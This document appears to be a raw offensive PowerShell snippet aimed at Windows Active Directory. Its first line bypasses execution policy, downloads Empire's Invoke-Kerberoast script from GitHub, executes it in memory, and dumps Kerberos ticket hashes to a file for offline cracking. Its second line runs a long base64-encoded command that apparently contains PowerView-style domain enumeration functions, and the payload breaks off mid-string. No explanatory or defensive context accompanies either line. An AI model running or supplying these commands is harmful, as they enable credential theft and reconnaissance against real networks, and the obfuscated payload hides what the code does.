powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"


powershell.exe -encodedcommand "ZnVuY3Rpb24gR2V0LURvbWFpblNlYXJjaGVyIHsKCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlcicpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUHJvcGVydGllcywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaEJhc2VQcmVmaXgsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQgPSAxMjAsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnRGFjbCcsICdHcm91cCcsICdOb25lJywgJ093bmVyJywgJ1NhY2wnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWN1cml0eU1hc2tzLAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIFBST0NFU1MgewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7CiAgICAgICAgICAgICRUYXJnZXREb21haW4gPSAkRG9tYWluCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAjIGlmIG5vdCAtRG9tYWluIGlzIHNwZWNpZmllZCwgcmV0cmlldmUgdGhlIGN1cnJlbnQgZG9tYWluIG5hbWUKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICAgICAkRG9tYWluT2JqZWN0ID0gR2V0LURvbWFpbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJERvbWFpbk9iamVjdCA9IEdldC1Eb21haW4KICAgICAgICAgICAgfQogICAgICAgICAgICAkVGFyZ2V0RG9tYWluID0gJERvbWFpbk9iamVjdC5OYW1lCiAgICAgICAgfQoKICAgICAgICBpZiAoLW5vdCAkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7CiAgICAgICAgICAgICMgaWYgdGhlcmUncyBub3QgYSBzcGVjaWZpZWQgc2VydmVyIHRvIGJpbmQgdG8sIHRyeSB0byBwdWxsIHRoZSBjdXJyZW50IGRvbWFpbiBQREMKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGlmICgkRG9tYWluT2JqZWN0KSB7CiAgICAgICAgICAgICAgICAgICAgJEJpbmRTZXJ2ZXIgPSAkRG9tYWluT2JqZWN0LlBkY1JvbGVPd25lci5OYW1lCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICAgICAgICAgJEJpbmRTZXJ2ZXIgPSAoKEdldC1Eb21haW4gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwpLlBkY1JvbGVPd25lcikuTmFtZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJEJpbmRTZXJ2ZXIgPSAoKEdldC1Eb21haW4pLlBkY1JvbGVPd25lcikuTmFtZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIHRocm93ICJbR2V0LURvbWFpblNlYXJjaGVyXSBFcnJvciBpbiByZXRyaWV2aW5nIFBEQyBmb3IgY3VycmVudCBkb21haW46ICRfIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkQmluZFNlcnZlciA9ICRTZXJ2ZXIKICAgICAgICB9CgogICAgICAgICRTZWFyY2hTdHJpbmcgPSAnTERBUDovLycKCiAgICAgICAgaWYgKCRCaW5kU2VydmVyIC1hbmQgKCRCaW5kU2VydmVyLlRyaW0oKSAtbmUgJycpKSB7CiAgICAgICAgICAgICRTZWFyY2hTdHJpbmcgKz0gJEJpbmRTZXJ2ZXIKICAgICAgICAgICAgaWYgKCRUYXJnZXREb21haW4pIHsKICAgICAgICAgICAgICAgICRTZWFyY2hTdHJpbmcgKz0gJy8nCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2VQcmVmaXgnXSkgewogICAgICAgICAgICAkU2VhcmNoU3RyaW5nICs9ICRTZWFyY2hCYXNlUHJlZml4ICsgJywnCiAgICAgICAgfQoKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsKICAgICAgICAgICAgaWYgKCRTZWFyY2hCYXNlIC1NYXRjaCAnXkdDOi8vJykgewogICAgICAgICAgICAgICAgIyBpZiB3ZSdyZSBzZWFyY2hpbmcgdGhlIGdsb2JhbCBjYXRhbG9nLCBnZXQgdGhlIHBhdGggaW4gdGhlIHJpZ2h0IGZvcm1hdAogICAgICAgICAgICAgICAgJEROID0gJFNlYXJjaEJhc2UuVG9VcHBlcigpLlRyaW0oJy8nKQogICAgICAgICAgICAgICAgJFNlYXJjaFN0cmluZyA9ICcnCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICBpZiAoJFNlYXJjaEJhc2UgLW1hdGNoICdeTERBUDovLycpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoJFNlYXJjaEJhc2UgLW1hdGNoICJMREFQOi8vLisvLisiKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hTdHJpbmcgPSAnJwogICAgICAgICAgICAgICAgICAgICAgICAkRE4gPSAkU2VhcmNoQmFzZQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJEROID0gJFNlYXJjaEJhc2UuU3ViU3RyaW5nKDcpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJEROID0gJFNlYXJjaEJhc2UKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgIyB0cmFuc2Zvcm0gdGhlIHRhcmdldCBkb21haW4gbmFtZSBpbnRvIGEgZGlzdGluZ3Vpc2hlZE5hbWUgaWYgYW4gQURTIHNlYXJjaCBiYXNlIGlzIG5vdCBzcGVjaWZpZWQKICAgICAgICAgICAgaWYgKCRUYXJnZXREb21haW4gLWFuZCAoJFRhcmdldERvbWFpbi5UcmltKCkgLW5lICcnKSkgewogICAgICAgICAgICAgICAgJEROID0gIkRDPSQoJFRhcmdldERvbWFpbi5SZXBsYWNlKCcuJywgJyxEQz0nKSkiCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgICRTZWFyY2hTdHJpbmcgKz0gJEROCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5TZWFyY2hlcl0gc2VhcmNoIHN0cmluZzogJFNlYXJjaFN0cmluZyIKCiAgICAgICAgaWYgKCRDcmVkZW50aWFsIC1uZSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5KSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluU2VhcmNoZXJdIFVzaW5nIGFsdGVybmF0ZSBjcmVkZW50aWFscyBmb3IgTERBUCBjb25uZWN0aW9uIgogICAgICAgICAgICAjIGJpbmQgdG8gdGhlIGluaXRhbCBzZWFyY2ggb2JqZWN0IHVzaW5nIGFsdGVybmF0ZSBjcmVkZW50aWFscwogICAgICAgICAgICAkRG9tYWluT2JqZWN0ID0gTmV3LU9iamVjdCBEaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlFbnRyeSgkU2VhcmNoU3RyaW5nLCAkQ3JlZGVudGlhbC5Vc2VyTmFtZSwgJENyZWRlbnRpYWwuR2V0TmV0d29ya0NyZWRlbnRpYWwoKS5QYXNzd29yZCkKICAgICAgICAgICAgJFNlYXJjaGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIoJERvbWFpbk9iamVjdCkKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICMgYmluZCB0byB0aGUgaW5pdGFsIG9iamVjdCB1c2luZyB0aGUgY3VycmVudCBjcmVkZW50aWFscwogICAgICAgICAgICAkU2VhcmNoZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlcihbQURTSV0kU2VhcmNoU3RyaW5nKQogICAgICAgIH0KCiAgICAgICAgJFNlYXJjaGVyLlBhZ2VTaXplID0gJFJlc3VsdFBhZ2VTaXplCiAgICAgICAgJFNlYXJjaGVyLlNlYXJjaFNjb3BlID0gJFNlYXJjaFNjb3BlCiAgICAgICAgJFNlYXJjaGVyLkNhY2hlUmVzdWx0cyA9ICRGYWxzZQogICAgICAgICRTZWFyY2hlci5SZWZlcnJhbENoYXNpbmcgPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLlJlZmVycmFsQ2hhc2luZ09wdGlvbl06OkFsbAoKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgewogICAgICAgICAgICAkU2VhcmNoZXIuU2VydmVyVGltZUxpbWl0ID0gJFNlcnZlclRpbWVMaW1pdAogICAgICAgIH0KCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsKICAgICAgICAgICAgJFNlYXJjaGVyLlRvbWJzdG9uZSA9ICRUcnVlCiAgICAgICAgfQoKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsKICAgICAgICAgICAgJFNlYXJjaGVyLmZpbHRlciA9ICRMREFQRmlsdGVyCiAgICAgICAgfQoKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWN1cml0eU1hc2tzJ10pIHsKICAgICAgICAgICAgJFNlYXJjaGVyLlNlY3VyaXR5TWFza3MgPSBTd2l0Y2ggKCRTZWN1cml0eU1hc2tzKSB7CiAgICAgICAgICAgICAgICAnRGFjbCcgeyBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLlNlY3VyaXR5TWFza3NdOjpEYWNsIH0KICAgICAgICAgICAgICAgICdHcm91cCcgeyBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLlNlY3VyaXR5TWFza3NdOjpHcm91cCB9CiAgICAgICAgICAgICAgICAnTm9uZScgeyBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLlNlY3VyaXR5TWFza3NdOjpOb25lIH0KICAgICAgICAgICAgICAgICdPd25lcicgeyBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLlNlY3VyaXR5TWFza3NdOjpPd25lciB9CiAgICAgICAgICAgICAgICAnU2FjbCcgeyBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLlNlY3VyaXR5TWFza3NdOjpTYWNsIH0KICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUHJvcGVydGllcyddKSB7CiAgICAgICAgICAgICMgaGFuZGxlIGFuIGFycmF5IG9mIHByb3BlcnRpZXMgdG8gbG9hZCB3LyB0aGUgcG9zc2liaWxpdHkgb2YgY29tbWEtc2VwYXJhdGVkIHN0cmluZ3MKICAgICAgICAgICAgJFByb3BlcnRpZXNUb0xvYWQgPSAkUHJvcGVydGllc3wgRm9yRWFjaC1PYmplY3QgeyAkXy5TcGxpdCgnLCcpIH0KICAgICAgICAgICAgJE51bGwgPSAkU2VhcmNoZXIuUHJvcGVydGllc1RvTG9hZC5BZGRSYW5nZSgoJFByb3BlcnRpZXNUb0xvYWQpKQogICAgICAgIH0KCiAgICAgICAgJFNlYXJjaGVyCiAgICB9Cn0KCgpmdW5jdGlvbiBDb252ZXJ0LUxEQVBQcm9wZXJ0eSB7CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3VzdG9tT2JqZWN0JyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICAkUHJvcGVydGllcwogICAgKQoKICAgICRPYmplY3RQcm9wZXJ0aWVzID0gQHt9CgogICAgJFByb3BlcnRpZXMuUHJvcGVydHlOYW1lcyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICBpZiAoJF8gLW5lICdhZHNwYXRoJykgewogICAgICAgICAgICBpZiAoKCRfIC1lcSAnb2JqZWN0c2lkJykgLW9yICgkXyAtZXEgJ3NpZGhpc3RvcnknKSkgewogICAgICAgICAgICAgICAgIyBjb252ZXJ0IGFsbCBsaXN0ZWQgc2lkcyAoaS5lLiBpZiBtdWx0aXBsZSBhcmUgbGlzdGVkIGluIHNpZEhpc3RvcnkpCiAgICAgICAgICAgICAgICAkT2JqZWN0UHJvcGVydGllc1skX10gPSAkUHJvcGVydGllc1skX10gfCBGb3JFYWNoLU9iamVjdCB7IChOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuU2VjdXJpdHlJZGVudGlmaWVyKCRfLCAwKSkuVmFsdWUgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZiAoJF8gLWVxICdncm91cHR5cGUnKSB7CiAgICAgICAgICAgICAgICAkT2JqZWN0UHJvcGVydGllc1skX10gPSAkUHJvcGVydGllc1skX11bMF0gLWFzICRHcm91cFR5cGVFbnVtCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmICgkXyAtZXEgJ3NhbWFjY291bnR0eXBlJykgewogICAgICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNbJF9dID0gJFByb3BlcnRpZXNbJF9dWzBdIC1hcyAkU2FtQWNjb3VudFR5cGVFbnVtCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmICgkXyAtZXEgJ29iamVjdGd1aWQnKSB7CiAgICAgICAgICAgICAgICAjIGNvbnZlcnQgdGhlIEdVSUQgdG8gYSBzdHJpbmcKICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWyRfXSA9IChOZXctT2JqZWN0IEd1aWQgKCwkUHJvcGVydGllc1skX11bMF0pKS5HdWlkCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmICgkXyAtZXEgJ3VzZXJhY2NvdW50Y29udHJvbCcpIHsKICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWyRfXSA9ICRQcm9wZXJ0aWVzWyRfXVswXSAtYXMgJFVBQ0VudW0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlaWYgKCRfIC1lcSAnbnRzZWN1cml0eWRlc2NyaXB0b3InKSB7CiAgICAgICAgICAgICAgICAjICRPYmplY3RQcm9wZXJ0aWVzWyRfXSA9IE5ldy1PYmplY3QgU2VjdXJpdHkuQWNjZXNzQ29udHJvbC5SYXdTZWN1cml0eURlc2NyaXB0b3IgLUFyZ3VtZW50TGlzdCAkUHJvcGVydGllc1skX11bMF0sIDAKICAgICAgICAgICAgICAgICREZXNjcmlwdG9yID0gTmV3LU9iamVjdCBTZWN1cml0eS5BY2Nlc3NDb250cm9sLlJhd1NlY3VyaXR5RGVzY3JpcHRvciAtQXJndW1lbnRMaXN0ICRQcm9wZXJ0aWVzWyRfXVswXSwgMAogICAgICAgICAgICAgICAgaWYgKCREZXNjcmlwdG9yLk93bmVyKSB7CiAgICAgICAgICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNbJ093bmVyJ10gPSAkRGVzY3JpcHRvci5Pd25lcgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCREZXNjcmlwdG9yLkdyb3VwKSB7CiAgICAgICAgICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNbJ0dyb3VwJ10gPSAkRGVzY3JpcHRvci5Hcm91cAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCREZXNjcmlwdG9yLkRpc2NyZXRpb25hcnlBY2wpIHsKICAgICAgICAgICAgICAgICAgICAkT2JqZWN0UHJvcGVydGllc1snRGlzY3JldGlvbmFyeUFjbCddID0gJERlc2NyaXB0b3IuRGlzY3JldGlvbmFyeUFjbAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCREZXNjcmlwdG9yLlN5c3RlbUFjbCkgewogICAgICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWydTeXN0ZW1BY2wnXSA9ICREZXNjcmlwdG9yLlN5c3RlbUFjbAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2VpZiAoJF8gLWVxICdhY2NvdW50ZXhwaXJlcycpIHsKICAgICAgICAgICAgICAgIGlmICgkUHJvcGVydGllc1skX11bMF0gLWd0IFtEYXRlVGltZV06Ok1heFZhbHVlLlRpY2tzKSB7CiAgICAgICAgICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNbJF9dID0gIk5FVkVSIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNbJF9dID0gW2RhdGV0aW1lXTo6ZnJvbWZpbGV0aW1lKCRQcm9wZXJ0aWVzWyRfXVswXSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlaWYgKCAoJF8gLWVxICdsYXN0bG9nb24nKSAtb3IgKCRfIC1lcSAnbGFzdGxvZ29udGltZXN0YW1wJykgLW9yICgkXyAtZXEgJ3B3ZGxhc3RzZXQnKSAtb3IgKCRfIC1lcSAnbGFzdGxvZ29mZicpIC1vciAoJF8gLWVxICdiYWRQYXNzd29yZFRpbWUnKSApIHsKICAgICAgICAgICAgICAgICMgY29udmVydCB0aW1lc3RhbXBzCiAgICAgICAgICAgICAgICBpZiAoJFByb3BlcnRpZXNbJF9dWzBdIC1pcyBbU3lzdGVtLk1hcnNoYWxCeVJlZk9iamVjdF0pIHsKICAgICAgICAgICAgICAgICAgICAjIGlmIHdlIGhhdmUgYSBTeXN0ZW0uX19Db21PYmplY3QKICAgICAgICAgICAgICAgICAgICAkVGVtcCA9ICRQcm9wZXJ0aWVzWyRfXVswXQogICAgICAgICAgICAgICAgICAgIFtJbnQzMl0kSGlnaCA9ICRUZW1wLkdldFR5cGUoKS5JbnZva2VNZW1iZXIoJ0hpZ2hQYXJ0JywgW1N5c3RlbS5SZWZsZWN0aW9uLkJpbmRpbmdGbGFnc106OkdldFByb3BlcnR5LCAkTnVsbCwgJFRlbXAsICROdWxsKQogICAgICAgICAgICAgICAgICAgIFtJbnQzMl0kTG93ICA9ICRUZW1wLkdldFR5cGUoKS5JbnZva2VNZW1iZXIoJ0xvd1BhcnQnLCAgW1N5c3RlbS5SZWZsZWN0aW9uLkJpbmRpbmdGbGFnc106OkdldFByb3BlcnR5LCAkTnVsbCwgJFRlbXAsICROdWxsKQogICAgICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWyRfXSA9IChbZGF0ZXRpbWVdOjpGcm9tRmlsZVRpbWUoW0ludDY0XSgiMHh7MDp4OH17MTp4OH0iIC1mICRIaWdoLCAkTG93KSkpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAjIG90aGVyd2lzZSBqdXN0IGEgc3RyaW5nCiAgICAgICAgICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNbJF9dID0gKFtkYXRldGltZV06OkZyb21GaWxlVGltZSgoJFByb3BlcnRpZXNbJF9dWzBdKSkpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmICgkUHJvcGVydGllc1skX11bMF0gLWlzIFtTeXN0ZW0uTWFyc2hhbEJ5UmVmT2JqZWN0XSkgewogICAgICAgICAgICAgICAgIyB0cnkgdG8gY29udmVydCBtaXNjIGNvbSBvYmplY3RzCiAgICAgICAgICAgICAgICAkUHJvcCA9ICRQcm9wZXJ0aWVzWyRfXQogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAkVGVtcCA9ICRQcm9wWyRfXVswXQogICAgICAgICAgICAgICAgICAgIFtJbnQzMl0kSGlnaCA9ICRUZW1wLkdldFR5cGUoKS5JbnZva2VNZW1iZXIoJ0hpZ2hQYXJ0JywgW1N5c3RlbS5SZWZsZWN0aW9uLkJpbmRpbmdGbGFnc106OkdldFByb3BlcnR5LCAkTnVsbCwgJFRlbXAsICROdWxsKQogICAgICAgICAgICAgICAgICAgIFtJbnQzMl0kTG93ICA9ICRUZW1wLkdldFR5cGUoKS5JbnZva2VNZW1iZXIoJ0xvd1BhcnQnLCAgW1N5c3RlbS5SZWZsZWN0aW9uLkJpbmRpbmdGbGFnc106OkdldFByb3BlcnR5LCAkTnVsbCwgJFRlbXAsICROdWxsKQogICAgICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWyRfXSA9IFtJbnQ2NF0oIjB4ezA6eDh9ezE6eDh9IiAtZiAkSGlnaCwgJExvdykKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbQ29udmVydC1MREFQUHJvcGVydHldIGVycm9yOiAkXyIKICAgICAgICAgICAgICAgICAgICAkT2JqZWN0UHJvcGVydGllc1skX10gPSAkUHJvcFskX10KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlaWYgKCRQcm9wZXJ0aWVzWyRfXS5jb3VudCAtZXEgMSkgewogICAgICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNbJF9dID0gJFByb3BlcnRpZXNbJF9dWzBdCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkT2JqZWN0UHJvcGVydGllc1skX10gPSAkUHJvcGVydGllc1skX10KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIHRyeSB7CiAgICAgICAgTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QgLVByb3BlcnR5ICRPYmplY3RQcm9wZXJ0aWVzCiAgICB9CiAgICBjYXRjaCB7CiAgICAgICAgV3JpdGUtV2FybmluZyAiW0NvbnZlcnQtTERBUFByb3BlcnR5XSBFcnJvciBwYXJzaW5nIExEQVAgcHJvcGVydGllcyA6ICRfIgogICAgfQp9CgoKZnVuY3Rpb24gR2V0LURvbWFpbiB7CgogICAgW091dHB1dFR5cGUoW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRG9tYWluXSldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1tHZXQtRG9tYWluXSBVc2luZyBhbHRlcm5hdGUgY3JlZGVudGlhbHMgZm9yIEdldC1Eb21haW4nCgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgewogICAgICAgICAgICAgICAgJFRhcmdldERvbWFpbiA9ICREb21haW4KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICMgaWYgbm8gZG9tYWluIGlzIHN1cHBsaWVkLCBleHRyYWN0IHRoZSBsb2dvbiBkb21haW4gZnJvbSB0aGUgUFNDcmVkZW50aWFsIHBhc3NlZAogICAgICAgICAgICAgICAgJFRhcmdldERvbWFpbiA9ICRDcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50aWFsKCkuRG9tYWluCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbl0gRXh0cmFjdGVkIGRvbWFpbiAnJFRhcmdldERvbWFpbicgZnJvbSAtQ3JlZGVudGlhbCIKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJERvbWFpbkNvbnRleHQgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRGlyZWN0b3J5Q29udGV4dCgnRG9tYWluJywgJFRhcmdldERvbWFpbiwgJENyZWRlbnRpYWwuVXNlck5hbWUsICRDcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50aWFsKCkuUGFzc3dvcmQpCgogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRG9tYWluXTo6R2V0RG9tYWluKCREb21haW5Db250ZXh0KQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluXSBUaGUgc3BlY2lmaWVkIGRvbWFpbiAnJFRhcmdldERvbWFpbicgZG9l